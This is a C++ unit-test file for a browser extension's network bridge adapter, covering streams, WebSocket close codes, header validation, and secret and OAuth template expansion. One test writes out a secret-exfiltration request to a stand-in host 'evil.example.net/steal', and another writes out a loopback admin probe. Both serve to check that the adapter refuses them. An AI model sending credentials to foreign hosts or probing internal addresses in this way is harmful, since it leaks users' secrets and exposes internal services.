// Copyright 2026 The Custom Browser Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "custom_browser/browser/nexus/api/network/nexus_network_bridge_adapter.h"

#include <memory>
#include <optional>
#include <string>
#include <string_view>
#include <utility>

#include "base/test/bind.h"
#include "base/values.h"
#include "components/os_crypt/async/browser/test_utils.h"
#include "components/prefs/pref_registry_simple.h"
#include "components/prefs/testing_pref_service.h"
#include "custom_browser/browser/nexus/api/llm/llm_pref_names.h"
#include "custom_browser/browser/nexus/api/secrets/nexus_secret_store.h"
#include "custom_browser/browser/nexus/nexus_secret_crypt.h"
#include "services/network/public/cpp/resource_request.h"
#include "content/public/test/browser_task_environment.h"
#include "custom_browser/browser/nexus/nexus_bridge_response_delegate.h"
#include "mojo/public/cpp/base/big_buffer.h"
#include "net/base/ip_address.h"
#include "net/base/ip_endpoint.h"
#include "net/base/proxy_chain.h"
#include "services/network/public/cpp/url_loader_completion_status.h"
#include "services/network/public/mojom/url_response_head.mojom.h"
#include "services/network/public/cpp/weak_wrapper_shared_url_loader_factory.h"
#include "services/network/test/test_url_loader_factory.h"
#include "services/network/test/test_utils.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "url/gurl.h"

namespace nexus {
namespace {

class RecordingDelegate : public NexusBridgeResponseDelegate {
 public:
  int success_count = 0;
  int binary_count = 0;
  int error_count = 0;
  base::Value last_success;
  base::Value last_binary_envelope;
  std::string last_binary_bytes;
  std::string last_error_code;

  void SendSuccessResponse(const std::string& /*id*/,
                           const base::DictValue& /*route*/,
                           base::Value result) override {
    ++success_count;
    last_success = std::move(result);
  }
  void SendBinaryResponse(const std::string& /*id*/,
                          const base::DictValue& /*route*/,
                          base::Value result,
                          mojo_base::BigBuffer data,
                          std::string_view /*result_binary_field*/) override {
    ++binary_count;
    last_binary_envelope = std::move(result);
    last_binary_bytes.assign(reinterpret_cast<const char*>(data.data()),
                             data.size());
  }
  void SendErrorResponse(const std::string& /*id*/,
                         const base::DictValue& /*route*/,
                         const std::string& code,
                         const std::string& /*message*/) override {
    ++error_count;
    last_error_code = code;
  }
  void SendEvent(const base::DictValue& /*route*/,
                 base::Value /*payload*/) override {}
};

base::DictValue NetworkRoute(std::string_view action) {
  base::DictValue route;
  route.Set("namespace", "nexus");
  route.Set("capability", "network");
  route.Set("action", std::string(action));
  return route;
}

class NexusNetworkStreamTest : public testing::Test {
 protected:
  NexusNetworkStreamTest() {
    adapter_.SetURLLoaderFactoryForTesting(factory_.GetSafeWeakWrapper());
  }

  void Dispatch(std::string_view action, base::DictValue payload) {
    EXPECT_TRUE(adapter_.Dispatch(action, "req", NetworkRoute(action),
                                  payload, {}));
    task_environment_.RunUntilIdle();
  }

  static base::DictValue OpenPayload(const std::string& url) {
    base::DictValue payload;
    payload.Set("url", url);
    // A `bytes` input that is empty inline is read from a transferred port
    // instead (the guest sends an empty body that way); a test without a
    // port sends one inline byte.
    payload.Set("method", "POST");
    base::ListValue body;
    body.Append(120);
    payload.Set("body", std::move(body));
    payload.Set("streamId", "stream-0001");
    return payload;
  }

  // An httpRequest POST with one inline body byte (see OpenPayload).
  static base::DictValue RequestPayload(const std::string& url) {
    base::DictValue payload;
    payload.Set("url", url);
    payload.Set("method", "POST");
    base::ListValue body;
    body.Append(1);
    payload.Set("body", std::move(body));
    return payload;
  }

  content::BrowserTaskEnvironment task_environment_;
  network::TestURLLoaderFactory factory_;
  RecordingDelegate delegate_;
  NexusNetworkBridgeAdapter adapter_{&delegate_, nullptr};
};

TEST_F(NexusNetworkStreamTest, OpenReadDoneOverThePublicInternet) {
  const GURL url("https://api.example.com/events");
  auto head = network::CreateURLResponseHead(net::HTTP_OK);
  head->remote_endpoint = net::IPEndPoint(net::IPAddress(93, 184, 216, 34), 443);
  head->proxy_chain = net::ProxyChain::Direct();
  factory_.AddResponse(url, std::move(head), "data: hi\n\n",
                       network::URLLoaderCompletionStatus(net::OK));

  Dispatch("streamOpen", OpenPayload(url.spec()));
  ASSERT_EQ(delegate_.success_count, 1) << delegate_.last_error_code;
  EXPECT_EQ(*delegate_.last_success.GetDict().FindString("streamId"),
            "stream-0001");
  EXPECT_EQ(delegate_.last_success.GetDict().FindInt("status"), 200);

  base::DictValue read;
  read.Set("streamId", "stream-0001");
  Dispatch("streamRead", std::move(read));
  ASSERT_EQ(delegate_.binary_count, 1);
  EXPECT_EQ(delegate_.last_binary_bytes, "data: hi\n\n");
  EXPECT_EQ(delegate_.last_binary_envelope.GetDict().FindBool("done"), true);
  // `done` erases the stream.
  EXPECT_EQ(adapter_.stream_count_for_testing(), 0u);
}

TEST_F(NexusNetworkStreamTest, ALiteralPrivateHostIsRefusedBeforeDialing) {
  Dispatch("streamOpen", OpenPayload("http://127.0.0.1:8080/admin"));
  EXPECT_EQ(delegate_.last_error_code, "EGRESS_BLOCKED");
  EXPECT_EQ(adapter_.stream_count_for_testing(), 0u);
}

TEST_F(NexusNetworkStreamTest, ReservedHeadersAreRefused) {
  base::DictValue payload = OpenPayload("https://api.example.com/x");
  base::DictValue headers;
  headers.Set("Cookie", "session=1");
  payload.Set("headers", std::move(headers));
  Dispatch("streamOpen", std::move(payload));
  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");
}

TEST_F(NexusNetworkStreamTest, CancelBeforeOpenRefusesTheOpen) {
  base::DictValue cancel;
  cancel.Set("streamId", "stream-0001");
  Dispatch("streamCancel", std::move(cancel));
  EXPECT_EQ(delegate_.success_count, 1);
  Dispatch("streamOpen", OpenPayload("https://api.example.com/late"));
  EXPECT_EQ(delegate_.last_error_code, "CANCELLED");
}

TEST_F(NexusNetworkStreamTest, ClosingTheConnectionCancelsOpenStreams) {
  // No response registered: the open stays pending on the head.
  Dispatch("streamOpen", OpenPayload("https://api.example.com/slow"));
  EXPECT_EQ(adapter_.stream_count_for_testing(), 1u);
  adapter_.OnBridgeConnectionClosed();
  EXPECT_EQ(adapter_.stream_count_for_testing(), 0u);
}

// maxResponseBytes is a guest double: one past size_t saturates to "no
// practical cap" instead of an undefined cast (0 on x64 — every byte too
// large).
TEST_F(NexusNetworkStreamTest, AHugeResponseCapStillReadsTheBody) {
  const GURL url("https://api.example.com/big-cap");
  auto head = network::CreateURLResponseHead(net::HTTP_OK);
  head->remote_endpoint = net::IPEndPoint(net::IPAddress(93, 184, 216, 34), 443);
  head->proxy_chain = net::ProxyChain::Direct();
  factory_.AddResponse(url, std::move(head), "body",
                       network::URLLoaderCompletionStatus(net::OK));

  base::DictValue payload = OpenPayload(url.spec());
  payload.Set("maxResponseBytes", 1e300);
  Dispatch("streamOpen", std::move(payload));
  ASSERT_EQ(delegate_.success_count, 1) << delegate_.last_error_code;

  base::DictValue read;
  read.Set("streamId", "stream-0001");
  Dispatch("streamRead", std::move(read));
  EXPECT_EQ(delegate_.error_count, 0) << delegate_.last_error_code;
  ASSERT_EQ(delegate_.binary_count, 1);
  EXPECT_EQ(delegate_.last_binary_bytes, "body");
}

// wsClose takes what the WebSocket API's close() takes; anything else is
// refused rather than sent as 1011 by the network service.
TEST_F(NexusNetworkStreamTest, WsCloseRefusesCodesAndReasonsCloseWouldNot) {
  auto close = [&](std::optional<int> code, std::string reason) {
    base::DictValue payload;
    payload.Set("socketId", "no-such-socket");
    if (code) {
      payload.Set("code", *code);
    }
    payload.Set("reason", std::move(reason));
    delegate_.last_error_code.clear();
    const int before = delegate_.success_count;
    Dispatch("wsClose", std::move(payload));
    return delegate_.success_count > before ? std::string("ok")
                                            : delegate_.last_error_code;
  };
  EXPECT_EQ(close(std::nullopt, ""), "ok");
  EXPECT_EQ(close(1000, "bye"), "ok");
  EXPECT_EQ(close(3000, ""), "ok");
  EXPECT_EQ(close(4999, std::string(123, 'r')), "ok");
  EXPECT_EQ(close(1001, ""), "INVALID_ARGS");
  EXPECT_EQ(close(2999, ""), "INVALID_ARGS");
  EXPECT_EQ(close(5000, ""), "INVALID_ARGS");
  EXPECT_EQ(close(1000, std::string(124, 'r')), "INVALID_ARGS");
}

// {{secret:NAME}} goes into a request to the secret's own origin, and
// nowhere else.
class NexusNetworkSecretsTest : public NexusNetworkStreamTest {
 protected:
  NexusNetworkSecretsTest() {
    prefs_.registry()->RegisterDictionaryPref(prefs::kNexusSecrets);
    NexusSecretCrypt::GetInstance()->SetEncryptorForTesting(
        os_crypt_async::GetTestEncryptorForTesting());
    adapter_.SetPrefsForTesting(&prefs_);
    EXPECT_FALSE(NexusSecretStore(&prefs_).Set(
        "provider:acme", "tok-123", "https://api.example.com"));
  }

  TestingPrefServiceSimple prefs_;
};

TEST_F(NexusNetworkSecretsTest, ASecretReachesOnlyItsOrigin) {
  std::string seen_auth;
  GURL seen_url;
  factory_.SetInterceptor(
      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
        seen_auth = request.headers.GetHeader("Authorization").value_or("");
        seen_url = request.url;
      }));

  base::DictValue payload = OpenPayload("https://api.example.com/v1/run");
  base::DictValue headers;
  headers.Set("Authorization", "Bearer {{secret:provider:acme}}");
  payload.Set("headers", std::move(headers));
  base::DictValue query;
  query.Set("key", "{{secret:provider:acme}}");
  payload.Set("queryParams", std::move(query));
  Dispatch("streamOpen", std::move(payload));
  EXPECT_EQ(seen_auth, "Bearer tok-123");
  EXPECT_EQ(seen_url.query(), "key=tok-123");

  // Another origin: refused before anything is sent.
  seen_auth.clear();
  base::DictValue elsewhere = OpenPayload("https://evil.example.net/steal");
  elsewhere.Set("streamId", "stream-0002");
  base::DictValue evil_headers;
  evil_headers.Set("Authorization", "Bearer {{secret:provider:acme}}");
  elsewhere.Set("headers", std::move(evil_headers));
  Dispatch("streamOpen", std::move(elsewhere));
  EXPECT_EQ(delegate_.last_error_code, "SECRET_ORIGIN_MISMATCH");
  EXPECT_TRUE(seen_auth.empty());
}

TEST_F(NexusNetworkSecretsTest, HttpRequestExpandsHeadersToo) {
  std::string seen_key;
  factory_.SetInterceptor(
      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
        seen_key = request.headers.GetHeader("X-Api-Key").value_or("");
      }));
  base::DictValue payload;
  payload.Set("url", "https://api.example.com/v1/ping");
  payload.Set("method", "POST");
  base::ListValue body;
  body.Append(1);  // see OpenPayload: an empty inline body needs a port
  payload.Set("body", std::move(body));
  base::DictValue headers;
  headers.Set("X-Api-Key", "{{secret:provider:acme}}");
  payload.Set("headers", std::move(headers));
  Dispatch("httpRequest", std::move(payload));
  EXPECT_EQ(seen_key, "tok-123");

  base::DictValue missing;
  missing.Set("url", "https://api.example.com/v1/ping");
  missing.Set("method", "POST");
  base::ListValue missing_body;
  missing_body.Append(1);
  missing.Set("body", std::move(missing_body));
  base::DictValue missing_headers;
  missing_headers.Set("X-Api-Key", "{{secret:provider:nope}}");
  missing.Set("headers", std::move(missing_headers));
  Dispatch("httpRequest", std::move(missing));
  EXPECT_EQ(delegate_.last_error_code, "SECRET_UNAVAILABLE");
}

// A secret expanded into the query goes on the wire but never comes back to
// the guest: finalUrl shows the placeholder.
TEST_F(NexusNetworkSecretsTest, FinalUrlNeverEchoesAnExpandedSecret) {
  const GURL sent("https://api.example.com/v1/ping?key=tok-123");
  auto head = network::CreateURLResponseHead(net::HTTP_OK);
  head->remote_endpoint = net::IPEndPoint(net::IPAddress(93, 184, 216, 34), 443);
  head->proxy_chain = net::ProxyChain::Direct();
  factory_.AddResponse(sent, std::move(head), "ok",
                       network::URLLoaderCompletionStatus(net::OK));

  base::DictValue payload = RequestPayload("https://api.example.com/v1/ping");
  base::DictValue query;
  query.Set("key", "{{secret:provider:acme}}");
  payload.Set("queryParams", std::move(query));
  Dispatch("httpRequest", std::move(payload));
  ASSERT_EQ(delegate_.binary_count, 1) << delegate_.last_error_code;
  const std::string* final_url =
      delegate_.last_binary_envelope.GetDict().FindString("finalUrl");
  ASSERT_TRUE(final_url);
  EXPECT_EQ(final_url->find("tok-123"), std::string::npos) << *final_url;
  EXPECT_NE(final_url->find("key=%7B%7Bsecret%3Aprovider%3Aacme%7D%7D"),
            std::string::npos)
      << *final_url;
}

TEST_F(NexusNetworkSecretsTest, StreamFinalUrlNeverEchoesAnExpandedSecret) {
  const GURL sent("https://api.example.com/v1/run?key=tok-123");
  auto head = network::CreateURLResponseHead(net::HTTP_OK);
  head->remote_endpoint = net::IPEndPoint(net::IPAddress(93, 184, 216, 34), 443);
  head->proxy_chain = net::ProxyChain::Direct();
  factory_.AddResponse(sent, std::move(head), "data: hi\n\n",
                       network::URLLoaderCompletionStatus(net::OK));

  base::DictValue payload = OpenPayload("https://api.example.com/v1/run");
  base::DictValue query;
  query.Set("key", "{{secret:provider:acme}}");
  payload.Set("queryParams", std::move(query));
  Dispatch("streamOpen", std::move(payload));
  ASSERT_EQ(delegate_.success_count, 1) << delegate_.last_error_code;
  const std::string* final_url =
      delegate_.last_success.GetDict().FindString("finalUrl");
  ASSERT_TRUE(final_url);
  EXPECT_EQ(final_url->find("tok-123"), std::string::npos) << *final_url;
}

// net::HttpRequestHeaders::SetHeader CHECKs a header's name and value; a
// guest header that would fail it is refused, not sent (which used to take
// the whole browser down on httpGet / httpRequest).
TEST_F(NexusNetworkStreamTest, MalformedHeadersAreRefusedOnEverySurface) {
  int requests = 0;
  factory_.SetInterceptor(base::BindLambdaForTesting(
      [&](const network::ResourceRequest&) { ++requests; }));

  base::DictValue bad_value;
  bad_value.Set("X-Note", "a\nb");
  base::DictValue bad_name;
  bad_name.Set("X Api Key", "abc");

  base::DictValue get;
  get.Set("url", "https://api.example.com/page");
  get.Set("headers", bad_name.Clone());
  Dispatch("httpGet", std::move(get));
  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");

  delegate_.last_error_code.clear();
  base::DictValue request = RequestPayload("https://api.example.com/v1/ping");
  request.Set("headers", bad_value.Clone());
  Dispatch("httpRequest", std::move(request));
  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");

  delegate_.last_error_code.clear();
  base::DictValue stream = OpenPayload("https://api.example.com/x");
  stream.Set("headers", bad_value.Clone());
  Dispatch("streamOpen", std::move(stream));
  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");
  EXPECT_EQ(requests, 0);

  // Control: the same httpRequest with a well-formed header goes out, so the
  // refusals above were the headers' and not the payload's.
  base::DictValue good = RequestPayload("https://api.example.com/v1/ping");
  base::DictValue good_headers;
  good_headers.Set("X-Note", "fine");
  good.Set("headers", std::move(good_headers));
  Dispatch("httpRequest", std::move(good));
  EXPECT_EQ(requests, 1);
}

// {{oauth:NAME}} on the network surfaces needs a providerId, and the URL
// must stay on that provider's domain — refused before any token is fetched.
TEST_F(NexusNetworkStreamTest, OAuthTemplatesNeedAProviderAndItsDomain) {
  base::DictValue payload = OpenPayload("https://api.example.com/v1/run");
  base::DictValue headers;
  headers.Set("Authorization", "Bearer {{oauth:access_token}}");
  payload.Set("headers", headers.Clone());
  Dispatch("streamOpen", std::move(payload));
  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");

  // An unknown provider (no profile here) anchors nowhere.
  base::DictValue with_provider = OpenPayload("https://api.example.com/v1/run");
  with_provider.Set("headers", std::move(headers));
  with_provider.Set("providerId", "chatgpt-pro");
  Dispatch("streamOpen", std::move(with_provider));
  EXPECT_EQ(delegate_.last_error_code, "TARGET_NOT_ALLOWED");
  EXPECT_EQ(adapter_.stream_count_for_testing(), 0u);
}

}  // namespace
}  // namespace nexus
